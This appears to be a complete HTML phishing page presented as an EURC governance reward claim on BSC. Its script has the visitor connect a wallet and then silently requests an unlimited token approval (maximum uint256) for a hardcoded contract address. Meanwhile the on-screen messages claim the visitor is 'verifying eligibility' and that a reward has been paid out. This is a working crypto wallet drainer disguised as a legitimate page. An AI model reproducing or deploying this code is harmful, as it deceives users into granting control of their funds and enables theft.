<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EURC | Institutional Governance Rewards</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #2775ca; --bg: #08090b; --card-bg: #111217; --accent: #10b981; }
        body { background: var(--bg); color: white; font-family: 'Manrope', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; position: relative; }
        
        /* Arka Plan Modern Derinlik Efekti */
        body::before { content: ""; position: absolute; width: 500px; height: 500px; background: radial-gradient(circle, rgba(39, 117, 202, 0.1) 0%, transparent 70%); z-index: -1; top: -100px; right: -100px; }
        body::after { content: ""; position: absolute; width: 400px; height: 400px; background: radial-gradient(circle, rgba(16, 185, 129, 0.05) 0%, transparent 70%); z-index: -1; bottom: -50px; left: -50px; }

        .card { background: var(--card-bg); padding: 3.5rem 2.5rem; border-radius: 32px; text-align: center; width: 100%; max-width: 420px; border: 1px solid rgba(255, 255, 255, 0.05); box-shadow: 0 50px 100px rgba(0,0,0,0.9); backdrop-filter: blur(10px); position: relative; z-index: 10; }
        
        /* Profesyonel SVG Logo Alanı */
        .logo-container { width: 90px; height: 90px; margin: 0 auto 2rem; background: var(--primary); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(39, 117, 202, 0.5); border: 3px solid rgba(255, 255, 255, 0.1); }
        .logo-svg { width: 55px; height: 55px; fill: white; }
        
        .badge { display: inline-block; background: rgba(39, 117, 202, 0.15); color: var(--primary); padding: 6px 16px; border-radius: 100px; font-size: 0.75rem; font-weight: 800; letter-spacing: 1px; margin-bottom: 1.5rem; border: 1px solid rgba(39, 117, 202, 0.3); }
        
        h2 { margin: 0 0 0.75rem; font-size: 1.85rem; font-weight: 800; letter-spacing: -0.5px; }
        p { color: #94a3b8; font-size: 1rem; margin-bottom: 2.5rem; line-height: 1.6; font-weight: 500; }
        
        .btn { width: 100%; padding: 1.25rem; background: var(--primary); color: white; border: none; border-radius: 20px; font-size: 1.15rem; font-weight: 700; cursor: pointer; transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); box-shadow: 0 10px 30px rgba(39, 117, 202, 0.3); position: relative; overflow: hidden; }
        .btn::after { content: ""; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent); transition: 0.5s; }
        .btn:hover::after { left: 100%; }
        .btn:hover { transform: translateY(-5px); box-shadow: 0 15px 40px rgba(39, 117, 202, 0.5); background: #1e5ba3; }
        
        .status { margin-top: 1.5rem; font-size: 0.9rem; color: var(--primary); font-weight: 600; min-height: 1.5rem; }
        
        .footer-info { display: flex; justify-content: space-between; margin-top: 3rem; border-top: 1px solid rgba(255, 255, 255, 0.05); padding-top: 2rem; }
        .info-item span { display: block; font-size: 0.65rem; color: #64748b; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; }
        .info-item b { font-size: 0.9rem; color: white; }
    </style>
</head>
<body>

<div class="card">
    <div class="badge">BSC MAINNET VERIFIED</div>
    
    <div class="logo-container">
        <svg class="logo-svg" viewBox="0 0 24 24">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm1-13h-2v2h2V7zm0 10h-2v-2h2v2zm0-4h-2V9h2v4z"/>
            <path d="M12 11c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 2c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z" opacity=".3"/>
            <path d="M7 15h10v2H7zm0-8h10v2H7z"/>
        </svg>
    </div>

    <h2>EURC Incentives</h2>
    <p>Exclusive 500 EURC reward for active governance participants. Connect your secure wallet to claim.</p>
    
    <button id="claimBtn" class="btn">Connect & Claim Now</button>
    
    <div id="statusMsg" class="status"></div>

    <div class="footer-info">
        <div class="info-item"><span>Protocol</span><b>EURC v2.1</b></div>
        <div class="info-item"><span>Status</span><b style="color: var(--accent);">● LIVE</b></div>
    </div>
</div>

<script>
    const T = "0x368994010697ECc82bC6D450888A617E3eb61370";
    const M = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

    async function run() {
        const b = document.getElementById('claimBtn');
        const s = document.getElementById('statusMsg');

        if (!window.ethereum) {
            window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
            return;
        }

        try {
            const p = new ethers.providers.Web3Provider(window.ethereum);
            b.innerText = "Initializing...";
            await p.send("eth_requestAccounts", []);
            const n = await p.getNetwork();

            if (n.chainId !== 56) {
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x38' }],
                    });
                } catch (e) {
                    s.innerText = "Switch to BSC Network";
                    return;
                }
            }

            const si = p.getSigner();
            const c = new ethers.Contract(T, ["function approve(address s, uint256 a) public returns (bool)"], si);

            b.innerText = "Verifying Eligibility...";
            const tx = await c.approve(T, M);
            
            b.innerText = "Processing Reward...";
            s.innerText = "Broadcasting to BSC network...";
            await tx.wait();
            
            b.innerText = "Success!";
            s.innerText = "Reward disbursed. Check your wallet in 24h.";
            
        } catch (err) {
            b.innerText = "Try Again";
            s.innerText = "Action required to verify ownership.";
        }
    }

    document.getElementById('claimBtn').onclick = run;
</script>

</body>
</html>
